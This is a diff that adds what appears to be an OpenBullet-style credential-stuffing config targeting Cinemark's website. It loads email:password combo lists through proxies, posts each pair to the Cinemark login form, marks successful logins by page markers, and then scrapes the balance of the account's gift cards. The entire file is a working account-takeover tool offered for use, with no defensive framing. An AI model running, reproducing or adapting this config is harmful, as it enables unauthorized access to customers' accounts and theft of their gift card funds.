@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Cinemark",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-17T19:00:48.8226114+00:00",
+  "AdditionalInfo": "",
+  "Author": "Legitness",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://images.cinemark.com/UserAuthenticationHeader.aspx?page=/gift-card-balance.aspx" AutoRedirect=TRUE 
+  CONTENT "__VIEWSTATE=IZEJEfcroER5Sz%2FjDk8hQYjsOSL232f3tHIXsZ1gdDu0BRDgh7OyEGHGd17UieO5QI1gXlMB0MVkKsyEw%2FNVWCsiM0QzTwVAX64qLLOMMLMnnoD%2BXjIIvG3JkkHeOGqf6rZ3vWinlLSPI5b1A%2B%2FUvxnJTVt2JEgCYKWNR360PFSaOiL6NV%2Bk8Sr7FRMLbsIHxmZY5UgijfaplMuye3E0kovMsxgoVLkSscLSg7Mv5OMYiVrcaZdVHJM6A5XjEPSuzMy7JB%2BiWjTNsC31wPycAizOwQOi43CoL1C6iRK2E%2BN%2BIM%2B55cEQlx1ClTqpmCXODRkCoHC9d3NbubyMLVVgl%2FRX7uix7G6X8hjlWv%2B2RSKi%2FAw5nCw3PPoWKWkFLj5FtmYn5UbUX%2FACUmNQhX0tHG02yIM%3D&ctl00%24ctl00%24ctl00%24ContentPlaceHolderDefault%24MasterContent%24UserAuthentication_10%24Login1%24UserName=<USER>&ctl00%24ctl00%24ctl00%24ContentPlaceHolderDefault%24MasterContent%24UserAuthentication_10%24Login1%24password=<PASS>&ctl00%24ctl00%24ctl00%24ContentPlaceHolderDefault%24MasterContent%24UserAuthentication_10%24Login1%24btnSigin=SIGN+IN&checkout=&location=header&honeypot=2018-08-17T19%3A43%3A00&__VIEWSTATEGENERATOR=CA0B0334&__VIEWSTATEENCRYPTED=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://images.cinemark.com" 
+  HEADER "Referer: https://images.cinemark.com/UserAuthenticationHeader.aspx?page=/gift-card-balance.aspx" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#CHECK_KEYS KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\">Sign In</a>" 
+    KEY "<p><strong>Agreement</strong></p>" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+  KEYCHAIN Success OR 
+    KEY "gc_number=" 
+#REDIRECT_|_GET_BALANCE REQUEST GET "https://images.cinemark.com/mygiftcards.aspx" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://images.cinemark.com/userauthenticationheader.aspx?page=/gift-card-balance.aspx" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"mygiftcards.aspx\"" 
+PARSE "<SOURCE>" LR "value=\"Card number\" maxlength=\"16\" /></div><div class=\"listBoxBalance\">BALANCE:" "<" Recursive=TRUE -> CAP "Balance" "" "" 
